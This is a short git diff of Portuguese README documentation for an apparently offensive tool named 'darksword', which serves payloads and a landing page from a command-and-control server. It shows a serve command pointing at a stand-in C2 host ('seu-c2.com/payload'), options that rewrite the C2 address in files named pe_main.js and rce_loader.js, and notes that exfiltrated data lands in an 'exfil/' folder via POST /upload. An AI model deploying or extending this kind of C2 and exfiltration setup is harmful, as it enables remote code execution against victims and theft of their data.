@@ -48,8 +48,10 @@ darksword serve -p 8443 --c2-host https://seu-c2.com/payload
 
 - `-H, --host`: Host (padrão: 0.0.0.0)
 - `-p, --port`: Porta (padrão: 8080)
-- `--c2-host`: Substitui a URL do C2 no rce_loader.js
+- `--c2-host`: C2 customizado (ex: `http://seu-ip:8080`) - sobrescreve host/porta no pe_main.js
 - `--redirect`: URL de redirecionamento em fallback
+
+Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.
 
 ### Gerar landing page customizada
 
